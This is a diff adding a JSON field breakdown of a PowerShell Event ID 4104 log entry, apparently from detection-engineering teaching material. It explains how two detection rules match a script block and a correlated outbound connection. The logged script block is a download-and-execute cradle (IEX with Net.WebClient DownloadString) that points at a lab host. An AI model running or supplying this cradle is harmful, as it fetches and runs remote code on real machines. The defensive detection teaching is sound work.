@@ -1,0 +1,20 @@
+{
+  "title": "Event ID 4104 for a download-cradle script block",
+  "event_type": "Microsoft-Windows-PowerShell/Operational channel, EventID 4104 (Creating Scriptblock text), correlated with the same process's outbound connection",
+  "fields": [
+    { "label": "TimeCreated", "value": "2026-09-15 08:33:02.417" },
+    { "label": "Computer", "value": "WKSTN-LAB07.corp.local" },
+    { "label": "ScriptBlockId", "value": "{8f2a1c4e-9b3d-4a71-a2e8-661cddb5f9a0}" },
+    { "label": "MessageNumber / MessageTotal", "value": "1 of 1" },
+    { "label": "ScriptBlockText", "value": "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.22/harmless.ps1')" },
+    { "label": "Path", "value": "-" },
+    { "label": "ProcessId (powershell.exe)", "value": "4412" },
+    { "label": "Correlated connection (same ProcessGuid, +2s)", "value": "TCP 10.10.14.22:80, dest process powershell.exe (PID 4412)" }
+  ],
+  "callouts": [
+    { "number": 1, "field_label": "ScriptBlockText", "explanation": "Contains both the fetch half (Net.WebClient / DownloadString) and the execute half (IEX) in one logged block, the exact fetch-and-execute pairing DET-10-01 matches on." },
+    { "number": 2, "field_label": "MessageNumber / MessageTotal", "explanation": "Confirms this script block was logged in a single 4104 event rather than split across multiple entries — the reassembly caveat called out in the DET-10-01 discussion doesn't apply to this run." },
+    { "number": 3, "field_label": "Correlated connection (same ProcessGuid, +2s)", "explanation": "The outbound connection to the test listener, tied to the same process as the 4104 event, is what DET-10-02's network-correlation join is checking for alongside the script-block signal." }
+  ],
+  "note": "Conceptual, illustrative field breakdown of the Detection Test in Part 10 Section 8 — not a captured screenshot of any product interface."
+}
